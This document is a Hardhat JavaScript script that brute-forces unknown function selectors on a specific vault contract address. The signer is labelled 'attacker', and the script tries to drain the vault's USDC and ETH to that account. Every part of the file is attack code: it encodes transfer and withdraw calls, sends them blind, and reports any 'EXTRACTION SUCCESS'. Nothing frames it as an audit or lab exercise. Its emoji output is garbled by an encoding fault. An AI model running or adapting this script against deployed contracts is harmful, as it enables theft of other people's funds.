const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Deep Function Analysis
 * @notice Analyze unknown functions with various parameter combinations
 * @dev Try to find USDC extraction methods
 */
async function main() {
  console.log("\nüî¨ DEEP FUNCTION ANALYSIS");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  const USDC = await ethers.getContractAt("contracts/IERC20.sol:IERC20", USDC_ADDRESS);
  
  // Get initial balances
  const vaultETHBefore = await ethers.provider.getBalance(VAULT_ADDRESS);
  const vaultUSDCBefore = await USDC.balanceOf(VAULT_ADDRESS);
  
  console.log("Initial vault ETH:", ethers.formatEther(vaultETHBefore), "ETH");
  console.log("Initial vault USDC:", ethers.formatUnits(vaultUSDCBefore, 6), "USDC");
  
  // Unknown function selectors from previous analysis
  const unknownSelectors = [
    "0x42e94c90", "0x715018a6", "0x5f504a82", "0x893d20e8", "0xdaea85c5",
    "0x43d726d6", "0x3f4ba83a", "0x5c975abb", "0x8456cb59", "0xf3fef3a3",
    "0x2e1a7d4d", "0xd0e30db0", "0x3ccfd60b", "0xdb006a75", "0x853828b6",
    "0x01681a62", "0x1357b113", "0x17a15037", "0x23c65fc7", "0x2da5d96a",
    "0x33a76d82", "0x39df670f", "0x3ab2f4e0", "0x4782f779", "0x4b670fc8",
    "0x536db266", "0x69328dec", "0x7fd5dc80", "0x8129fc1c"
  ];
  
  console.log("\nüîç Testing selectors with token-specific parameters...");
  
  for (const selector of unknownSelectors) {
    console.log(`\nüìå Testing ${selector}:`);
    
    // Test 1: No parameters
    try {
      const tx1 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 500000
      });
      await tx1.wait();
      console.log("  ‚úÖ No params - Success");
    } catch (e) {
      // Silent
    }
    
    // Test 2: Token address only
    try {
      const data2 = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [USDC_ADDRESS]
      ).slice(2);
      
      const tx2 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data2,
        gasLimit: 500000
      });
      await tx2.wait();
      console.log("  ‚úÖ Token address - Success");
    } catch (e) {
      // Silent
    }
    
    // Test 3: Token address + amount
    try {
      const data3 = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256"],
        [USDC_ADDRESS, vaultUSDCBefore]
      ).slice(2);
      
      const tx3 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data3,
        gasLimit: 500000
      });
      await tx3.wait();
      console.log("  ‚úÖ Token + amount - Success");
    } catch (e) {
      // Silent
    }
    
    // Test 4: Address + token + amount (for transferFrom-like)
    try {
      const data4 = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "address", "uint256"],
        [attacker.address, USDC_ADDRESS, vaultUSDCBefore]
      ).slice(2);
      
      const tx4 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data4,
        gasLimit: 500000
      });
      await tx4.wait();
      console.log("  ‚úÖ Address + token + amount - Success");
    } catch (e) {
      // Silent
    }
    
    // Test 5: Try with bytes data (for execute-like functions)
    try {
      // Encode a transfer call
      const transferData = USDC.interface.encodeFunctionData("transfer", [attacker.address, vaultUSDCBefore]);
      const data5 = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [USDC_ADDRESS, 0, transferData]
      ).slice(2);
      
      const tx5 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data5,
        gasLimit: 1000000
      });
      await tx5.wait();
      console.log("  ‚úÖ Execute pattern - Success");
    } catch (e) {
      // Silent
    }
    
    // Check if balances changed
    const vaultETHAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
    const vaultUSDCAfter = await USDC.balanceOf(VAULT_ADDRESS);
    const attackerUSDCAfter = await USDC.balanceOf(attacker.address);
    
    if (vaultETHAfter < vaultETHBefore) {
      console.log("  üí∞ ETH EXTRACTED:", ethers.formatEther(vaultETHBefore - vaultETHAfter), "ETH");
    }
    
    if (vaultUSDCAfter < vaultUSDCBefore) {
      console.log("  üíµ USDC EXTRACTED:", ethers.formatUnits(vaultUSDCBefore - vaultUSDCAfter, 6), "USDC");
    }
    
    if (attackerUSDCAfter > 0n) {
      console.log("  üéØ ATTACKER RECEIVED:", ethers.formatUnits(attackerUSDCAfter, 6), "USDC");
    }
  }
  
  // Try specific patterns that might work
  console.log("\nüé≤ Testing specific exploit patterns...");
  
  // Pattern 1: Emergency withdraw pattern
  const emergencyPatterns = [
    { selector: "0x01681a62", name: "emergencyWithdraw" },
    { selector: "0xdb006a75", name: "redeem" },
    { selector: "0xf3fef3a3", name: "withdraw" },
    { selector: "0x69328dec", name: "harvestAndCompound" }
  ];
  
  for (const pattern of emergencyPatterns) {
    try {
      // Try with token parameter
      const data = pattern.selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [USDC_ADDRESS]
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 1000000
      });
      await tx.wait();
      console.log(`‚úÖ ${pattern.name} with token executed`);
    } catch (e) {
      // Continue
    }
  }
  
  // Final balance check
  const finalVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const finalVaultUSDC = await USDC.balanceOf(VAULT_ADDRESS);
  const finalAttackerUSDC = await USDC.balanceOf(attacker.address);
  
  console.log("\nüìä FINAL RESULTS:");
  console.log("Vault ETH remaining:", ethers.formatEther(finalVaultETH), "ETH");
  console.log("Vault USDC remaining:", ethers.formatUnits(finalVaultUSDC, 6), "USDC");
  console.log("Attacker USDC balance:", ethers.formatUnits(finalAttackerUSDC, 6), "USDC");
  
  const totalETHExtracted = vaultETHBefore - finalVaultETH;
  const totalUSDCExtracted = vaultUSDCBefore - finalVaultUSDC;
  
  if (totalETHExtracted > 0n || totalUSDCExtracted > 0n) {
    console.log("\nüèÜ EXTRACTION SUCCESS!");
    if (totalETHExtracted > 0n) {
      console.log("Additional ETH extracted:", ethers.formatEther(totalETHExtracted), "ETH");
    }
    if (totalUSDCExtracted > 0n) {
      console.log("USDC extracted:", ethers.formatUnits(totalUSDCExtracted, 6), "USDC");
    }
  }
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
